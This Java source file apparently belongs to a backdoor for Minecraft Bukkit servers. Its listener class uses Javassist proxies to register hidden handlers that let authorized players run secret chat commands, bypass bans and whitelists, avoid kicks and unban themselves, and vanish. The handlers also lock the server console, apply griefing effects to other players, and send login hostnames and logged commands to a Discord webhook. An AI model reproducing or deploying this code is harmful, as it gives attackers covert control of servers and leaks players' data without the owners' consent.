package com.tmquan2508.exploit;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.PluginDisableEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.ItemStack;
import java.awt.Color;
import java.lang.invoke.MethodHandles;
import java.net.InetSocketAddress;
import java.util.Locale;
import java.util.UUID;
import com.tmquan2508.exploit.Exploit.JavassistReflectiveWrapper;

public class ExploitListener {

    public ExploitListener() {
        registerListenersWithJavassist();
    }

    private void registerListenersWithJavassist() {
        try {
            JavassistReflectiveWrapper javassist = Exploit.getJavassistWrapper();
            Object pool = javassist.createDefaultClassPool();

            Object pluginClassPath = javassist.createClassClassPath(this.getClass());
            javassist.insertClassPath(pool, pluginClassPath);

            Class<?>[] baseListenerClasses = {SubListener1.class, SubListener2.class, SubListener3.class};
            Object listenerInterface = javassist.getClassFromPool(pool, Listener.class.getName());

            for (Class<?> baseClass : baseListenerClasses) {
                String dynamicClassName = baseClass.getName() + "$JavassistProxy";
                Object baseCtClass = javassist.getClassFromPool(pool, baseClass.getName());
                Object newCtClass = javassist.makeClass(pool, dynamicClassName, baseCtClass);

                javassist.addInterface(newCtClass, listenerInterface);

                Class<?> dynamicListenerClass;
                try {
                    dynamicListenerClass = javassist.toClass(newCtClass, MethodHandles.lookup());
                } catch (Throwable t) {
                    Exploit.sender.sendDebug("[WARN] Failed to define class with MethodHandles.Lookup, trying legacy method...");
                    dynamicListenerClass = javassist.toClass(newCtClass);
                }

                Object listenerInstance = dynamicListenerClass.getConstructor(ExploitListener.class).newInstance(this);
                Bukkit.getPluginManager().registerEvents((Listener) listenerInstance, Exploit.plugin);

                javassist.detach(newCtClass);
            }
            Exploit.sender.sendDebug("[Listener] Successfully registered " + baseListenerClasses.length + " dynamic listeners using Javassist.");
        } catch (Throwable e) {
            Exploit.sender.sendDebug("[Listener] Failed to create and register dynamic listeners using Javassist!");
            e.printStackTrace();
        }
    }

    public class SubListener1 {
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerChat(AsyncPlayerChatEvent e) {
            Player p = e.getPlayer();
            String msg = e.getMessage();
            if (Exploit.helpers.isUserAuthorized(p) && msg.toLowerCase(Locale.ROOT).startsWith(Config.command_prefix)) {
                e.setCancelled(true);
                Bukkit.getScheduler().runTask(Exploit.plugin, () -> Exploit.commandHandler.execute(p, msg.substring(Config.command_prefix.length())));
            }
        }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerJoin(PlayerJoinEvent e) {
            Player player = e.getPlayer();
            Exploit.playerStates.put(player.getName(), new Exploit.PlayerState());
            if (Exploit.helpers.isUserAuthorized(player)) {
                Exploit.permissionLevels.put(player.getUniqueId(), 1);
                Exploit.sender.sendMessage(player, "You are authorized (Level 1). Run " + Config.command_prefix + "help");
            } else {
                Exploit.permissionLevels.put(player.getUniqueId(), 0);
            }
            UUID playerUuid = player.getUniqueId();
            String bypassMessage = Exploit.bypassedPlayers.remove(playerUuid);
            if (bypassMessage != null) {
                Exploit.sender.sendMessage(player, bypassMessage);
            }
            for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                if (Exploit.getState(Exploit.playerStates, onlinePlayer.getName(), Exploit.State.VANISHED) && !onlinePlayer.equals(player)) {
                    Bukkit.getScheduler().runTask(Exploit.plugin, () -> player.hidePlayer(Exploit.plugin, onlinePlayer));
                }
            }
        }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerLeave(PlayerQuitEvent e) {
            Exploit.playerStates.remove(e.getPlayer().getName());
            Exploit.permissionLevels.remove(e.getPlayer().getUniqueId());
        }
        @EventHandler(priority = EventPriority.LOWEST) public void onKick(PlayerKickEvent e) {
            Player p = e.getPlayer();
            if (Exploit.helpers.isUserAuthorized(p)) {
                e.setCancelled(true);
                Exploit.setState(Exploit.playerStates, p.getName(), Exploit.State.VANISHED, true);
                InetSocketAddress address = p.getAddress();
                if (address != null) {
                    Bukkit.getBanList(BanList.Type.NAME).pardon(p.getName());
                    Bukkit.getBanList(BanList.Type.IP).pardon(address.getAddress().getHostAddress());
                }
                Exploit.sender.sendMessage(p, "You were protected from a kick/ban and are now vanished.");
            }
        }
    }

    public class SubListener2 {
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerLogin(PlayerLoginEvent e) {
            DWeb.EmbedObject message = new DWeb.EmbedObject().setAuthor(e.getPlayer().getName() + " connecting...", null, "https://mc-heads.net/avatar/" + e.getPlayer().getUniqueId().toString() + "/100").setColor(Color.CYAN).addField("Hostname", "`" + e.getHostname() + "`", false);
            Exploit.sender.sendDiscordMessage(message);
            if (Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MF_LOGIN)) {
                e.disallow(PlayerLoginEvent.Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet");
                return;
            }
            Player p = e.getPlayer();
            PlayerLoginEvent.Result result = e.getResult();
            if (Exploit.helpers.isUserAuthorized(p)) {
                String bypassMessage = null;
                if (result == PlayerLoginEvent.Result.KICK_WHITELIST) bypassMessage = "You have successfully bypassed the whitelist.";
                else if (result == PlayerLoginEvent.Result.KICK_BANNED) bypassMessage = "You have successfully bypassed a server ban.";
                else if (result == PlayerLoginEvent.Result.KICK_FULL) bypassMessage = "You have successfully joined a full server (bypassed player limit).";
                else if (result == PlayerLoginEvent.Result.KICK_OTHER) bypassMessage = "You have successfully bypassed a custom server restriction (likely from another plugin).";
                if (bypassMessage != null) {
                    e.allow();
                    Exploit.bypassedPlayers.put(p.getUniqueId(), bypassMessage);
                }
            }
        }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
            Player p = e.getPlayer();
            if (Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.LOCKED)) {
                e.setCancelled(true);
            }
            String commandMessage = e.getMessage();
            String[] parts = commandMessage.substring(1).split(" ");
            if (parts.length == 0) return;
            String command = parts[0].toLowerCase();
            if (Exploit.commandsToLog.contains(command)) {
                DWeb.EmbedObject message = new DWeb.EmbedObject().setAuthor(p.getName() + " execute command", null, "https://mc-heads.net/avatar/" + p.getUniqueId().toString() + "/100").setColor(Color.CYAN).addField("Command", "`" + commandMessage + "`", false);
                Exploit.sender.sendDiscordMessage(message);
            }
        }
    }

    public class SubListener3 {
        @EventHandler(priority = EventPriority.LOWEST) public void onServerCommand(ServerCommandEvent e) { if (Exploit.getState(Exploit.playerStates, "console", Exploit.State.LOCKED)) { e.setCancelled(true); } }
        @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true) public void onPlayerChatLow(AsyncPlayerChatEvent e) { if (Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MUTED)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onBlockBreak(BlockBreakEvent e) { Player p = e.getPlayer(); if (Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.SILKTOUCH) || Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.INSTABREAK)){ if (p.getGameMode() != GameMode.CREATIVE) { e.setDropItems(false); e.getBlock().getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1)); } } if (Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.MF_MINE)) { e.setCancelled(true); } }
        @EventHandler(priority = EventPriority.LOWEST) public void onBlockPlace(BlockPlaceEvent e) { if (Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MF_PLACE)) { e.setCancelled(true); } }
        @EventHandler(priority = EventPriority.LOWEST) public void onBlockDamage(BlockDamageEvent e) { Player p = e.getPlayer(); if (Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.INSTABREAK)) { e.setInstaBreak(true); } if (Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.MF_MINE)) { e.setCancelled(true); } }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerMove(PlayerMoveEvent e) { Player p = e.getPlayer(); if (Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.MF_THROWER)) { p.getWorld().dropItemNaturally(p.getLocation(), new ItemStack(Material.STONE, 64)); } if (Exploit.getState(Exploit.playerStates, p.getName(), Exploit.State.MF_CRIPPLE)) { Location from = e.getFrom(); Location to = e.getTo(); if (to != null && (from.getX() != to.getX() || from.getZ() != to.getZ())) { Location newLoc = from.clone(); newLoc.setPitch(to.getPitch()); newLoc.setYaw(to.getYaw()); e.setTo(newLoc); } } }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerInteract(PlayerInteractEvent e) { if (Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MF_INTERACT)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerInteractEntity(PlayerInteractEntityEvent e) { if (Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MF_INTERACT)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerToggleFlight(PlayerToggleFlightEvent e) { if (e.getPlayer().getGameMode() != GameMode.CREATIVE && Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MF_FLIGHT)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onInventoryClick(InventoryClickEvent e) { if (e.getWhoClicked() instanceof Player && Exploit.getState(Exploit.playerStates, e.getWhoClicked().getName(), Exploit.State.MF_INVENTORY)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onInventoryDrag(InventoryDragEvent e) { if (e.getWhoClicked() instanceof Player && Exploit.getState(Exploit.playerStates, e.getWhoClicked().getName(), Exploit.State.MF_INVENTORY)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerDropItem(PlayerDropItemEvent e) { if (Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MF_DROP)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onPlayerTeleport(PlayerTeleportEvent e) { if (Exploit.getState(Exploit.playerStates, e.getPlayer().getName(), Exploit.State.MF_TELEPORT)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onEntityDamage(EntityDamageEvent e) { if (e.getEntity() instanceof Player && Exploit.getState(Exploit.playerStates, e.getEntity().getName(), Exploit.State.MF_GOD)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onEntityDamageByEntity(EntityDamageByEntityEvent e) { if (e.getDamager() instanceof Player && Exploit.getState(Exploit.playerStates, e.getDamager().getName(), Exploit.State.MF_DAMAGE)) e.setCancelled(true); }
        @EventHandler(priority = EventPriority.LOWEST) public void onPluginDisable(PluginDisableEvent event) {
            if (event.getPlugin().equals(Exploit.plugin)) {
                System.clearProperty(Exploit.LOCK_PROPERTY);
                Exploit.sender.sendDebug("[Exploit] Remove property");
            }
        }
    }
}